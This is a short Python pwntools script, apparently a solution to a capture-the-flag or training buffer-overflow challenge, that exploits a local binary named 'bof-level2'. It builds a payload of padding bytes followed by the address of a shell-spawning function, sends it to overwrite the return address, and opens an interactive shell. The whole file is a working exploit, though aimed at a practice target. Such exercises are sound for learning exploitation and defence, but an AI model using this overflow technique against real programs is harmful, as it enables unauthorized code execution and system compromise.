#!/usr/bin/env python

from pwn import *

p = process("./bof-level2")
# context.terminal = ['-v']
# gdb.attach(p, "b *receive_input+118")
getShellAddr = p32(0x8048530)

buf = "A"*20 + "ABCDEFGH" + "B"*8 + getShellAddr

# This prints the output from the program
print(p.recv())

print("sending " + buf)

p.sendline(buf)

# This allows direct interaction with the application
p.interactive()
